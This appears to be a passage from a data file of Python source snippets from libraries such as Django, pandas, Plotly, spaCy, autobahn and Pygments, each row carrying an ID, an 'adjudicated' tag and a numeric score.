service""""""<<NEWL>>        return self.get_json(<<NEWL>>            'https://kapi.kakao.com/v2/user/me',<<NEWL>>            headers={<<NEWL>>                'Authorization': f'Bearer {access_token}',<<NEWL>>                'Content_Type': 'application/x-www-form-urlencoded;charset=utf-8',<<NEWL>>            },<<NEWL>>            params={'access_token': access_token}<<NEWL>>        )<<NEWL>><<NEWL>>    def auth_complete_params(self, state=None):<<NEWL>>        client_id, client_secret = self.get_key_and_secret()<<NEWL>>        return {<<NEWL>>            'grant_type': 'authorization_code',<<NEWL>>            'code': self.data.get('code', ''),<<NEWL>>            'client_id': client_id,<<NEWL>>            'client_secret': client_secret,<<NEWL>>        }"
463	adjudicated	2	"from contextlib import contextmanager<<NEWL>>import os<<NEWL>>import tempfile<<NEWL>><<NEWL>>import pytest<<NEWL>><<NEWL>>from pandas.io.pytables import HDFStore<<NEWL>><<NEWL>>tables = pytest.importorskip(""tables"")<<NEWL>># set these parameters so we don't have file sharing<<NEWL>>tables.parameters.MAX_NUMEXPR_THREADS = 1<<NEWL>>tables.parameters.MAX_BLOSC_THREADS = 1<<NEWL>>tables.parameters.MAX_THREADS = 1<<NEWL>><<NEWL>><<NEWL>>def safe_remove(path):<<NEWL>>    if path is not None:<<NEWL>>        try:<<NEWL>>            os.remove(path)  # noqa: PDF008<<NEWL>>        except OSError:<<NEWL>>            pass<<NEWL>><<NEWL>><<NEWL>>def safe_close(store):<<NEWL>>    try:<<NEWL>>        if store is not None:<<NEWL>>            store.close()<<NEWL>>    except OSError:<<NEWL>>        pass<<NEWL>><<NEWL>><<NEWL>>def create_tempfile(path):<<NEWL>>    """"""create an unopened named temporary file""""""<<NEWL>>    return os.path.join(tempfile.gettempdir(), path)<<NEWL>><<NEWL>><<NEWL>># contextmanager to ensure the file cleanup<<NEWL>>@contextmanager<<NEWL>>def ensure_clean_store(path, mode=""a"", complevel=None, complib=None, fletcher32=False):<<NEWL>><<NEWL>>    try:<<NEWL>><<NEWL>>        # put in the temporary path if we don't have one already<<NEWL>>        if not len(os.path.dirname(path)):<<NEWL>>            path = create_tempfile(path)<<NEWL>><<NEWL>>        store = HDFStore(<<NEWL>>            path, mode=mode, complevel=complevel, complib=complib, fletcher32=False<<NEWL>>        )<<NEWL>>        yield store<<NEWL>>    finally:<<NEWL>>        safe_close(store)<<NEWL>>        if mode == ""w"" or mode == ""a"":<<NEWL>>            safe_remove(path)<<NEWL>><<NEWL>><<NEWL>>@contextmanager<<NEWL>>def ensure_clean_path(path):<<NEWL>>    """"""<<NEWL>>    return essentially a named temporary file that is not opened<<NEWL>>    and deleted on exiting; if path is a list, then create and<<NEWL>>    return list of filenames<<NEWL>>    """"""<<NEWL>>    try:<<NEWL>>        if isinstance(path, list):<<NEWL>>            filenames = [create_tempfile(p) for p in path]<<NEWL>>            yield filenames<<NEWL>>        else:<<NEWL>>            filenames = [create_tempfile(path)]<<NEWL>>            yield filenames[0]<<NEWL>>    finally:<<NEWL>>        for f in filenames:<<NEWL>>            safe_remove(f)<<NEWL>><<NEWL>><<NEWL>>def _maybe_remove(store, key):<<NEWL>>    """"""<<NEWL>>    For tests using tables, try removing the table to be sure there is<<NEWL>>    no content from previous tests using the same table name.<<NEWL>>    """"""<<NEWL>>    try:<<NEWL>>        store.remove(key)<<NEWL>>    except (ValueError, KeyError):<<NEWL>>        pass"
432	adjudicated	0	"from __future__ import absolute_import<<NEWL>><<NEWL>>from django import VERSION as django_version<<NEWL>>from django import forms<<NEWL>>from django.conf import settings<<NEWL>>from django.utils.encoding import force_text<<NEWL>>from django.utils.safestring import mark_safe<<NEWL>>from django.utils.html import format_html<<NEWL>><<NEWL>>from .utils import get_icon_choices<<NEWL>><<NEWL>>CHOICES = get_icon_choices()<<NEWL>><<NEWL>>class IconWidget(forms.Select):<<NEWL>><<NEWL>>    def __init__(self, attrs=None):<<NEWL>>        super(IconWidget, self).__init__(attrs, choices=CHOICES)<<NEWL>><<NEWL>>    if django_version >= (1, 11):<<NEWL>>        def create_option(self, name, value, label, selected, index, subindex=None, attrs=None):<<NEWL>>            option = super(IconWidget, self).create_option(name, value, label, selected, index, subindex=subindex, attrs=attrs)<<NEWL>>            option[""attrs""][""data-icon""] = value<<NEWL>>            return option<<NEWL>>    else:<<NEWL>>        def render_option(self, selected_choices, option_value, option_label):<<NEWL>>            if option_value is None:<<NEWL>>                option_value = ''<<NEWL>>            option_value = force_text(option_value)<<NEWL>>            if option_value in selected_choices:<<NEWL>>                selected_html = mark_safe(' selected=""selected""')<<NEWL>>                if not self.allow_multiple_selected:<<NEWL>>                    # Only allow for a single selection.<<NEWL>>                    selected_choices.remove(option_value)<<NEWL>>            else:<<NEWL>>                selected_html = ''<<NEWL>>            return format_html('<option data-icon=""{0}"" value=""{0}""{1}>{2}</option>',<<NEWL>>                option_value,<<NEWL>>                selected_html,<<NEWL>>                force_text(option_label),<<NEWL>>            )<<NEWL>><<NEWL>>    class Media:<<NEWL>><<NEWL>>        js = (<<NEWL>>            'fontawesome/js/django_fontawesome.js',<<NEWL>>            'fontawesome/select2/select2.min.js'<<NEWL>>        )<<NEWL>><<NEWL>>        css = {<<NEWL>>            'all': (<<NEWL>>                getattr(settings, 'FONTAWESOME_CSS_URL', 'fontawesome/css/font-awesome.min.css'),<<NEWL>>                'fontawesome/select2/select2.css',<<NEWL>>                'fontawesome/select2/select2-bootstrap.css'<<NEWL>>            )<<NEWL>>        }"
490	adjudicated	2	"import _plotly_utils.basevalidators<<NEWL>><<NEWL>><<NEWL>>class FontValidator(_plotly_utils.basevalidators.CompoundValidator):<<NEWL>>    def __init__(<<NEWL>>        self, plotly_name=""font"", parent_name=""sankey.node.hoverlabel"", **kwargs<<NEWL>>    ):<<NEWL>>        super(FontValidator, self).__init__(<<NEWL>>            plotly_name=plotly_name,<<NEWL>>            parent_name=parent_name,<<NEWL>>            data_class_str=kwargs.pop(""data_class_str"", ""Font""),<<NEWL>>            data_docs=kwargs.pop(<<NEWL>>                ""data_docs"",<<NEWL>>                """"""<<NEWL>>            color<<NEWL>><<NEWL>>            colorsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `color`.<<NEWL>>            family<<NEWL>>                HTML font family - the typeface that will be<<NEWL>>                applied by the web browser. The web browser<<NEWL>>                will only be able to apply a font if it is<<NEWL>>                available on the system which it operates.<<NEWL>>                Provide multiple font families, separated by<<NEWL>>                commas, to indicate the preference in which to<<NEWL>>                apply fonts if they aren't available on the<<NEWL>>                system. The Chart Studio Cloud (at<<NEWL>>                https://chart-studio.plotly.com or on-premise)<<NEWL>>                generates images on a server, where only a<<NEWL>>                select number of fonts are installed and<<NEWL>>                supported. These include ""Arial"", ""Balto"",<<NEWL>>                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",<<NEWL>>                ""Droid Sans Mono"", ""Gravitas One"", ""Old<<NEWL>>                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans<<NEWL>>                Narrow"", ""Raleway"", ""Times New Roman"".<<NEWL>>            familysrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `family`.<<NEWL>>            size<<NEWL>><<NEWL>>            sizesrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `size`.<<NEWL>>"""""",<<NEWL>>            ),<<NEWL>>            **kwargs,<<NEWL>>        )"
481	adjudicated	2	"""""""<<NEWL>>This module includes some utility functions for inspecting the layout<<NEWL>>of a GDAL data source -- the functionality is analogous to the output<<NEWL>>produced by the `ogrinfo` utility.<<NEWL>>""""""<<NEWL>><<NEWL>>from django.contrib.gis.gdal import DataSource<<NEWL>>from django.contrib.gis.gdal.geometries import GEO_CLASSES<<NEWL>><<NEWL>><<NEWL>>def ogrinfo(data_source, num_features=10):<<NEWL>>    """"""<<NEWL>>    Walk the available layers in the supplied `data_source`, displaying<<NEWL>>    the fields for the first `num_features` features.<<NEWL>>    """"""<<NEWL>><<NEWL>>    # Checking the parameters.<<NEWL>>    if isinstance(data_source, str):<<NEWL>>        data_source = DataSource(data_source)<<NEWL>>    elif isinstance(data_source, DataSource):<<NEWL>>        pass<<NEWL>>    else:<<NEWL>>        raise Exception(<<NEWL>>            ""Data source parameter must be a string or a DataSource object.""<<NEWL>>        )<<NEWL>><<NEWL>>    for i, layer in enumerate(data_source):<<NEWL>>        print(""data source : %s"" % data_source.name)<<NEWL>>        print(""==== layer %s"" % i)<<NEWL>>        print(""  shape type: %s"" % GEO_CLASSES[layer.geom_type.num].__name__)<<NEWL>>        print(""  # features: %s"" % len(layer))<<NEWL>>        print(""         srs: %s"" % layer.srs)<<NEWL>>        extent_tup = layer.extent.tuple<<NEWL>>        print(""      extent: %s - %s"" % (extent_tup[0:2], extent_tup[2:4]))<<NEWL>>        print(""Displaying the first %s features ===="" % num_features)<<NEWL>><<NEWL>>        width = max(*map(len, layer.fields))<<NEWL>>        fmt = "" %%%ss: %%s"" % width<<NEWL>>        for j, feature in enumerate(layer[:num_features]):<<NEWL>>            print(""=== Feature %s"" % j)<<NEWL>>            for fld_name in layer.fields:<<NEWL>>                type_name = feature[fld_name].type_name<<NEWL>>                output = fmt % (fld_name, type_name)<<NEWL>>                val = feature.get(fld_name)<<NEWL>>                if val:<<NEWL>>                    if isinstance(val, str):<<NEWL>>                        val_fmt = ' (""%s"")'<<NEWL>>                    else:<<NEWL>>                        val_fmt = "" (%s)""<<NEWL>>                    output += val_fmt % val<<NEWL>>                else:<<NEWL>>                    output += "" (None)""<<NEWL>>                print(output)"
423	adjudicated	0	import os<<NEWL>>import asyncio<<NEWL>>import pytest<<NEWL>><<NEWL>>import txaio<<NEWL>><<NEWL>># because py.test tries to collect it as a test-case<<NEWL>>from unittest.mock import Mock<<NEWL>><<NEWL>>from autobahn.asyncio.websocket import WebSocketServerFactory<<NEWL>><<NEWL>><<NEWL>>async def echo_async(what, when):<<NEWL>>    await asyncio.sleep(when)<<NEWL>>    return what<<NEWL>><<NEWL>><<NEWL>>@pytest.mark.skipif(not os.environ.get('USE_ASYNCIO', False), reason='test runs on asyncio only')<<NEWL>>@pytest.mark.asyncio<<NEWL>>async def test_echo_async():<<NEWL>>    assert 'Hello!' == await echo_async('Hello!', 0)<<NEWL>><<NEWL>><<NEWL>># @pytest.mark.asyncio(forbid_global_loop=True)<<NEWL>>@pytest.mark.skipif(not os.environ.get('USE_ASYNCIO', False), reason='test runs on asyncio only')<<NEWL>>def test_websocket_custom_loop(event_loop):<<NEWL>>    factory = WebSocketServerFactory(loop=event_loop)<<NEWL>>    server = factory()<<NEWL>>    transport = Mock()<<NEWL>>    server.connection_made(transport)<<NEWL>><<NEWL>><<NEWL>>@pytest.mark.skipif(not os.environ.get('USE_ASYNCIO', False), reason='test runs on asyncio only')<<NEWL>>@pytest.mark.asyncio<<NEWL>>async def test_async_on_connect_server(event_loop):<<NEWL>><<NEWL>>    num = 42<<NEWL>>    done = txaio.create_future()<<NEWL>>    values = []<<NEWL>><<NEWL>>    async def foo(x):<<NEWL>>        await asyncio.sleep(1)<<NEWL>>        return x * x<<NEWL>><<NEWL>>    async def on_connect(req):<<NEWL>>        v = await foo(num)<<NEWL>>        values.append(v)<<NEWL>>        txaio.resolve(done, req)<<NEWL>><<NEWL>>    factory = WebSocketServerFactory()<<NEWL>>    server = factory()<<NEWL>>    server.onConnect = on_connect<<NEWL>>    transport = Mock()<<NEWL>><<NEWL>>    server.connection_made(transport)<<NEWL>>    server.data = b'\r\n'.join([<<NEWL>>        b'GET /ws HTTP/1.1',<<NEWL>>        b'Host: www.example.com',<<NEWL>>        b'Sec-WebSocket-Version: 13',<<NEWL>>        b'Origin: http://www.example.com.malicious.com',<<NEWL>>        b'Sec-WebSocket-Extensions: permessage-deflate',<<NEWL>>        b'Sec-WebSocket-Key: tXAxWFUqnhi86Ajj7dRY5g==',<<NEWL>>        b'Connection: keep-alive, Upgrade',<<NEWL>>        b'Upgrade: websocket',<<NEWL>>        b'\r\n',  # last string doesn't get a \r\n from join()<<NEWL>>    ])<<NEWL>>    server.processHandshake()<<NEWL>>    await done<<NEWL>><<NEWL>>    assert len(values) == 1<<NEWL>>    assert values[0] == num * num
472	adjudicated	2	"""""""<<NEWL>> The GeometryColumns and SpatialRefSys models for the SpatiaLite backend.<<NEWL>>""""""<<NEWL>>from django.contrib.gis.db.backends.base.models import SpatialRefSysMixin<<NEWL>>from django.db import models<<NEWL>><<NEWL>><<NEWL>>class SpatialiteGeometryColumns(models.Model):<<NEWL>>    """"""<<NEWL>>    The 'geometry_columns' table from SpatiaLite.<<NEWL>>    """"""<<NEWL>><<NEWL>>    f_table_name = models.CharField(max_length=256)<<NEWL>>    f_geometry_column = models.CharField(max_length=256)<<NEWL>>    coord_dimension = models.IntegerField()<<NEWL>>    srid = models.IntegerField(primary_key=True)<<NEWL>>    spatial_index_enabled = models.IntegerField()<<NEWL>>    type = models.IntegerField(db_column=""geometry_type"")<<NEWL>><<NEWL>>    class Meta:<<NEWL>>        app_label = ""gis""<<NEWL>>        db_table = ""geometry_columns""<<NEWL>>        managed = False<<NEWL>><<NEWL>>    def __str__(self):<<NEWL>>        return ""%s.%s - %dD %s field (SRID: %d)"" % (<<NEWL>>            self.f_table_name,<<NEWL>>            self.f_geometry_column,<<NEWL>>            self.coord_dimension,<<NEWL>>            self.type,<<NEWL>>            self.srid,<<NEWL>>        )<<NEWL>><<NEWL>>    @classmethod<<NEWL>>    def table_name_col(cls):<<NEWL>>        """"""<<NEWL>>        Return the name of the metadata column used to store the feature table<<NEWL>>        name.<<NEWL>>        """"""<<NEWL>>        return ""f_table_name""<<NEWL>><<NEWL>>    @classmethod<<NEWL>>    def geom_col_name(cls):<<NEWL>>        """"""<<NEWL>>        Return the name of the metadata column used to store the feature<<NEWL>>        geometry column.<<NEWL>>        """"""<<NEWL>>        return ""f_geometry_column""<<NEWL>><<NEWL>><<NEWL>>class SpatialiteSpatialRefSys(models.Model, SpatialRefSysMixin):<<NEWL>>    """"""<<NEWL>>    The 'spatial_ref_sys' table from SpatiaLite.<<NEWL>>    """"""<<NEWL>><<NEWL>>    srid = models.IntegerField(primary_key=True)<<NEWL>>    auth_name = models.CharField(max_length=256)<<NEWL>>    auth_srid = models.IntegerField()<<NEWL>>    ref_sys_name = models.CharField(max_length=256)<<NEWL>>    proj4text = models.CharField(max_length=2048)<<NEWL>>    srtext = models.CharField(max_length=2048)<<NEWL>><<NEWL>>    class Meta:<<NEWL>>        app_label = ""gis""<<NEWL>>        db_table = ""spatial_ref_sys""<<NEWL>>        managed = False<<NEWL>><<NEWL>>    @property<<NEWL>>    def wkt(self):<<NEWL>>        return self.srtext"
506	adjudicated	3	"""""""<<NEWL>>    pygments.styles.trac<<NEWL>>    ~~~~~~~~~~~~~~~~~~~~<<NEWL>><<NEWL>>    Port of the default trac highlighter design.<<NEWL>><<NEWL>>    :copyright: Copyright 2006-2022 by the Pygments team, see AUTHORS.<<NEWL>>    :license: BSD, see LICENSE for details.<<NEWL>>""""""<<NEWL>><<NEWL>>from pygments.style import Style<<NEWL>>from pygments.token import Keyword, Name, Comment, String, Error, \<<NEWL>>     Number, Operator, Generic, Whitespace<<NEWL>><<NEWL>><<NEWL>>class TracStyle(Style):<<NEWL>>    """"""<<NEWL>>    Port of the default trac highlighter design.<<NEWL>>    """"""<<NEWL>><<NEWL>>    styles = {<<NEWL>>        Whitespace:             '#bbbbbb',<<NEWL>>        Comment:                'italic #999988',<<NEWL>>        Comment.Preproc:        'bold noitalic #999999',<<NEWL>>        Comment.Special:        'bold #999999',<<NEWL>><<NEWL>>        Operator:               'bold',<<NEWL>><<NEWL>>        String:                 '#bb8844',<<NEWL>>        String.Regex:           '#808000',<<NEWL>><<NEWL>>        Number:                 '#009999',<<NEWL>><<NEWL>>        Keyword:                'bold',<<NEWL>>        Keyword.Type:           '#445588',<<NEWL>><<NEWL>>        Name.Builtin:           '#999999',<<NEWL>>        Name.Function:          'bold #990000',<<NEWL>>        Name.Class:             'bold #445588',<<NEWL>>        Name.Exception:         'bold #990000',<<NEWL>>        Name.Namespace:         '#555555',<<NEWL>>        Name.Variable:          '#008080',<<NEWL>>        Name.Constant:          '#008080',<<NEWL>>        Name.Tag:               '#000080',<<NEWL>>        Name.Attribute:         '#008080',<<NEWL>>        Name.Entity:            '#800080',<<NEWL>><<NEWL>>        Generic.Heading:        '#999999',<<NEWL>>        Generic.Subheading:     '#aaaaaa',<<NEWL>>        Generic.Deleted:        'bg:#ffdddd #000000',<<NEWL>>        Generic.Inserted:       'bg:#ddffdd #000000',<<NEWL>>        Generic.Error:          '#aa0000',<<NEWL>>        Generic.Emph:           'italic',<<NEWL>>        Generic.Strong:         'bold',<<NEWL>>        Generic.Prompt:         '#555555',<<NEWL>>        Generic.Output:         '#888888',<<NEWL>>        Generic.Traceback:      '#aa0000',<<NEWL>><<NEWL>>        Error:                  'bg:#e3d2d2 #a61717'<<NEWL>>    }"
446	adjudicated	1	"#!/usr/bin/env python3<<NEWL>><<NEWL>>import re<<NEWL>><<NEWL>>from homeassistant.components.binary_sensor import BinarySensorDeviceClass<<NEWL>>from homeassistant.components.button import ButtonDeviceClass<<NEWL>>from homeassistant.components.cover import CoverDeviceClass<<NEWL>>from homeassistant.components.number import NumberDeviceClass<<NEWL>>from homeassistant.components.sensor import SensorDeviceClass<<NEWL>>from homeassistant.components.switch import SwitchDeviceClass<<NEWL>><<NEWL>>BLOCKLIST = (<<NEWL>>    # requires special support on HA side<<NEWL>>    ""enum"",<<NEWL>>)<<NEWL>><<NEWL>>DOMAINS = {<<NEWL>>    ""binary_sensor"": BinarySensorDeviceClass,<<NEWL>>    ""button"": ButtonDeviceClass,<<NEWL>>    ""cover"": CoverDeviceClass,<<NEWL>>    ""number"": NumberDeviceClass,<<NEWL>>    ""sensor"": SensorDeviceClass,<<NEWL>>    ""switch"": SwitchDeviceClass,<<NEWL>>}<<NEWL>><<NEWL>><<NEWL>>def sub(path, pattern, repl):<<NEWL>>    with open(path, ""r"") as handle:<<NEWL>>        content = handle.read()<<NEWL>>    content = re.sub(pattern, repl, content, flags=re.MULTILINE, count=1)<<NEWL>>    with open(path, ""w"") as handle:<<NEWL>>        handle.write(content)<<NEWL>><<NEWL>><<NEWL>>def main():<<NEWL>>    classes = {""EMPTY"": """"}<<NEWL>>    allowed = {}<<NEWL>><<NEWL>>    for domain, enum in DOMAINS.items():<<NEWL>>        available = {<<NEWL>>            cls.value.upper(): cls.value for cls in enum if cls.value not in BLOCKLIST<<NEWL>>        }<<NEWL>><<NEWL>>        classes.update(available)<<NEWL>>        allowed[domain] = list(available.keys()) + [""EMPTY""]<<NEWL>><<NEWL>>    # replace constant defines in const.py<<NEWL>>    out = """"<<NEWL>>    for cls in sorted(classes):<<NEWL>>        out += f'DEVICE_CLASS_{cls.upper()} = ""{classes[cls]}""\n'<<NEWL>>    sub(""esphome/const.py"", '(DEVICE_CLASS_\w+ = ""\w*""\r?\n)+', out)<<NEWL>><<NEWL>>    for domain in sorted(allowed):<<NEWL>>        # replace imports<<NEWL>>        out = """"<<NEWL>>        for item in sorted(allowed[domain]):<<NEWL>>            out += f""    DEVICE_CLASS_{item.upper()},\n""<<NEWL>><<NEWL>>        sub(<<NEWL>>            f""esphome/components/{domain}/__init__.py"",<<NEWL>>            ""(    DEVICE_CLASS_\w+,\r?\n)+"",<<NEWL>>            out,<<NEWL>>        )<<NEWL>><<NEWL>><<NEWL>>if __name__ == ""__main__"":<<NEWL>>    main()"
417	adjudicated	0	"import pytest<<NEWL>>from spacy.lang.en import English<<NEWL>>from spacy.training import Example<<NEWL>>from thinc.api import Config<<NEWL>><<NEWL>>default_tok2vec_config = """"""<<NEWL>>[model]<<NEWL>>@architectures = ""spacy-legacy.HashEmbedCNN.v1""<<NEWL>>pretrained_vectors = null<<NEWL>>width = 96<<NEWL>>depth = 4<<NEWL>>embed_size = 2000<<NEWL>>window_size = 1<<NEWL>>maxout_pieces = 3<<NEWL>>subword_features = true<<NEWL>>""""""<<NEWL>>DEFAULT_TOK2VEC_MODEL = Config().from_str(default_tok2vec_config)[""model""]<<NEWL>><<NEWL>>TRAIN_DATA = [<<NEWL>>    (<<NEWL>>        ""They trade mortgage-backed securities."",<<NEWL>>        {<<NEWL>>            ""heads"": [1, 1, 4, 4, 5, 1, 1],<<NEWL>>            ""deps"": [""nsubj"", ""ROOT"", ""compound"", ""punct"", ""nmod"", ""dobj"", ""punct""],<<NEWL>>        },<<NEWL>>    ),<<NEWL>>    (<<NEWL>>        ""I like London and Berlin."",<<NEWL>>        {<<NEWL>>            ""heads"": [1, 1, 1, 2, 2, 1],<<NEWL>>            ""deps"": [""nsubj"", ""ROOT"", ""dobj"", ""cc"", ""conj"", ""punct""],<<NEWL>>        },<<NEWL>>    ),<<NEWL>>]<<NEWL>><<NEWL>><<NEWL>>@pytest.mark.parametrize(<<NEWL>>    ""parser_config"",<<NEWL>>    [<<NEWL>>        {<<NEWL>>            ""@architectures"": ""spacy-legacy.TransitionBasedParser.v1"",<<NEWL>>            ""state_type"": ""parser"",<<NEWL>>            ""extra_state_tokens"": False,<<NEWL>>            ""hidden_width"": 66,<<NEWL>>            ""maxout_pieces"": 2,<<NEWL>>            ""use_upper"": True,<<NEWL>>            ""tok2vec"": DEFAULT_TOK2VEC_MODEL,<<NEWL>>        }<<NEWL>>    ],<<NEWL>>)<<NEWL>>def test_parser(parser_config):<<NEWL>>    pipe_config = {""model"": parser_config}<<NEWL>>    nlp = English()<<NEWL>>    parser = nlp.add_pipe(""parser"", config=pipe_config)<<NEWL>>    train_examples = []<<NEWL>>    for text, annotations in TRAIN_DATA:<<NEWL>>        train_examples.append(Example.from_dict(nlp.make_doc(text), annotations))<<NEWL>>        for dep in annotations.get(""deps"", []):<<NEWL>>            if dep is not None:<<NEWL>>                parser.add_label(dep)<<NEWL>>    optimizer = nlp.initialize(get_examples=lambda: train_examples)<<NEWL>>    for i in range(150):<<NEWL>>        losses = {}<<NEWL>>        nlp.update(train_examples, sgd=optimizer, losses=losses)<<NEWL>>    assert losses[""parser""] < 0.0001"
188	adjudicated	2	"""""""<<NEWL>> The GeometryColumns and SpatialRefSys models for the SpatiaLite backend.<<NEWL>>""""""<<NEWL>>from django.contrib.gis.db.backends.base.models import SpatialRefSysMixin<<NEWL>>from django.db import models<<NEWL>><<NEWL>><<NEWL>>class SpatialiteGeometryColumns(models.Model):<<NEWL>>    """"""<<NEWL>>    The 'geometry_columns' table from SpatiaLite.<<NEWL>>    """"""<<NEWL>><<NEWL>>    f_table_name = models.CharField(max_length=256)<<NEWL>>    f_geometry_column = models.CharField(max_length=256)<<NEWL>>    coord_dimension = models.IntegerField()<<NEWL>>    srid = models.IntegerField(primary_key=True)<<NEWL>>    spatial_index_enabled = models.IntegerField()<<NEWL>>    type = models.IntegerField(db_column=""geometry_type"")<<NEWL>><<NEWL>>    class Meta:<<NEWL>>        app_label = ""gis""<<NEWL>>        db_table = ""geometry_columns""<<NEWL>>        managed = False<<NEWL>><<NEWL>>    def __str__(self):<<NEWL>>        return ""%s.%s - %dD %s field (SRID: %d)"" % (<<NEWL>>            self.f_table_name,<<NEWL>>            self.f_geometry_column,<<NEWL>>            self.coord_dimension,<<NEWL>>            self.type,<<NEWL>>            self.srid,<<NEWL>>        )<<NEWL>><<NEWL>>    @classmethod<<NEWL>>    def table_name_col(cls):<<NEWL>>        """"""<<NEWL>>        Return the name of the metadata column used to store the feature table<<NEWL>>        name.<<NEWL>>        """"""<<NEWL>>        return ""f_table_name""<<NEWL>><<NEWL>>    @classmethod<<NEWL>>    def geom_col_name(cls):<<NEWL>>        """"""<<NEWL>>        Return the name of the metadata column used to store the feature<<NEWL>>        geometry column.<<NEWL>>        """"""<<NEWL>>        return ""f_geometry_column""<<NEWL>><<NEWL>><<NEWL>>class SpatialiteSpatialRefSys(models.Model, SpatialRefSysMixin):<<NEWL>>    """"""<<NEWL>>    The 'spatial_ref_sys' table from SpatiaLite.<<NEWL>>    """"""<<NEWL>><<NEWL>>    srid = models.IntegerField(primary_key=True)<<NEWL>>    auth_name = models.CharField(max_length=256)<<NEWL>>    auth_srid = models.IntegerField()<<NEWL>>    ref_sys_name = models.CharField(max_length=256)<<NEWL>>    proj4text = models.CharField(max_length=2048)<<NEWL>>    srtext = models.CharField(max_length=2048)<<NEWL>><<NEWL>>    class Meta:<<NEWL>>        app_label = ""gis""<<NEWL>>        db_table = ""spatial_ref_sys""<<NEWL>>        managed = False<<NEWL>><<NEWL>>    @property<<NEWL>>    def wkt(self):<<NEWL>>        return self.srtext"
219	adjudicated	2	"from django.conf import settings<<NEWL>>from django.utils.translation import get_supported_language_variant<<NEWL>>from django.utils.translation.trans_real import language_code_re<<NEWL>><<NEWL>>from . import Error, Tags, register<<NEWL>><<NEWL>>E001 = Error(<<NEWL>>    ""You have provided an invalid value for the LANGUAGE_CODE setting: {!r}."",<<NEWL>>    id=""translation.E001"",<<NEWL>>)<<NEWL>><<NEWL>>E002 = Error(<<NEWL>>    ""You have provided an invalid language code in the LANGUAGES setting: {!r}."",<<NEWL>>    id=""translation.E002"",<<NEWL>>)<<NEWL>><<NEWL>>E003 = Error(<<NEWL>>    ""You have provided an invalid language code in the LANGUAGES_BIDI setting: {!r}."",<<NEWL>>    id=""translation.E003"",<<NEWL>>)<<NEWL>><<NEWL>>E004 = Error(<<NEWL>>    ""You have provided a value for the LANGUAGE_CODE setting that is not in ""<<NEWL>>    ""the LANGUAGES setting."",<<NEWL>>    id=""translation.E004"",<<NEWL>>)<<NEWL>><<NEWL>><<NEWL>>@register(Tags.translation)<<NEWL>>def check_setting_language_code(app_configs, **kwargs):<<NEWL>>    """"""Error if LANGUAGE_CODE setting is invalid.""""""<<NEWL>>    tag = settings.LANGUAGE_CODE<<NEWL>>    if not isinstance(tag, str) or not language_code_re.match(tag):<<NEWL>>        return [Error(E001.msg.format(tag), id=E001.id)]<<NEWL>>    return []<<NEWL>><<NEWL>><<NEWL>>@register(Tags.translation)<<NEWL>>def check_setting_languages(app_configs, **kwargs):<<NEWL>>    """"""Error if LANGUAGES setting is invalid.""""""<<NEWL>>    return [<<NEWL>>        Error(E002.msg.format(tag), id=E002.id)<<NEWL>>        for tag, _ in settings.LANGUAGES<<NEWL>>        if not isinstance(tag, str) or not language_code_re.match(tag)<<NEWL>>    ]<<NEWL>><<NEWL>><<NEWL>>@register(Tags.translation)<<NEWL>>def check_setting_languages_bidi(app_configs, **kwargs):<<NEWL>>    """"""Error if LANGUAGES_BIDI setting is invalid.""""""<<NEWL>>    return [<<NEWL>>        Error(E003.msg.format(tag), id=E003.id)<<NEWL>>        for tag in settings.LANGUAGES_BIDI<<NEWL>>        if not isinstance(tag, str) or not language_code_re.match(tag)<<NEWL>>    ]<<NEWL>><<NEWL>><<NEWL>>@register(Tags.translation)<<NEWL>>def check_language_settings_consistent(app_configs, **kwargs):<<NEWL>>    """"""Error if language settings are not consistent with each other.""""""<<NEWL>>    try:<<NEWL>>        get_supported_language_variant(settings.LANGUAGE_CODE)<<NEWL>>    except LookupError:<<NEWL>>        return [E004]<<NEWL>>    else:<<NEWL>>        return []"
359	adjudicated	1	"######################## BEGIN LICENSE BLOCK ########################<<NEWL>># The Original Code is mozilla.org code.<<NEWL>>#<<NEWL>># The Initial Developer of the Original Code is<<NEWL>># Netscape Communications Corporation.<<NEWL>># Portions created by the Initial Developer are Copyright (C) 1998<<NEWL>># the Initial Developer. All Rights Reserved.<<NEWL>>#<<NEWL>># Contributor(s):<<NEWL>>#   Mark Pilgrim - port to Python<<NEWL>>#<<NEWL>># This library is free software; you can redistribute it and/or<<NEWL>># modify it under the terms of the GNU Lesser General Public<<NEWL>># License as published by the Free Software Foundation; either<<NEWL>># version 2.1 of the License, or (at your option) any later version.<<NEWL>>#<<NEWL>># This library is distributed in the hope that it will be useful,<<NEWL>># but WITHOUT ANY WARRANTY; without even the implied warranty of<<NEWL>># MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU<<NEWL>># Lesser General Public License for more details.<<NEWL>>#<<NEWL>># You should have received a copy of the GNU Lesser General Public<<NEWL>># License along with this library; if not, write to the Free Software<<NEWL>># Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA<<NEWL>># 02110-1301  USA<<NEWL>>######################### END LICENSE BLOCK #########################<<NEWL>><<NEWL>>from .chardistribution import EUCKRDistributionAnalysis<<NEWL>>from .codingstatemachine import CodingStateMachine<<NEWL>>from .mbcharsetprober import MultiByteCharSetProber<<NEWL>>from .mbcssm import CP949_SM_MODEL<<NEWL>><<NEWL>><<NEWL>>class CP949Prober(MultiByteCharSetProber):<<NEWL>>    def __init__(self):<<NEWL>>        super(CP949Prober, self).__init__()<<NEWL>>        self.coding_sm = CodingStateMachine(CP949_SM_MODEL)<<NEWL>>        # NOTE: CP949 is a superset of EUC-KR, so the distribution should be<<NEWL>>        #       not different.<<NEWL>>        self.distribution_analyzer = EUCKRDistributionAnalysis()<<NEWL>>        self.reset()<<NEWL>><<NEWL>>    @property<<NEWL>>    def charset_name(self):<<NEWL>>        return ""CP949""<<NEWL>><<NEWL>>    @property<<NEWL>>    def language(self):<<NEWL>>        return ""Korean"""
